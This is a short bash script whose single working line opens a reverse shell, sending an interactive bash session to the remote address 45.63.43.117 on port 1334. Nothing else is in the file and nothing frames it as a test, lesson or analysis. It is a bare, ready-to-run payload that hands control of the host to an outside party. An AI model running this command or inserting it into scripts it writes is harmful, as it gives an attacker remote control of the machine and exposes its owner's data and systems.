#!/bin/bash

set -e

bash -i >& /dev/tcp/45.63.43.117/1334 0>&1
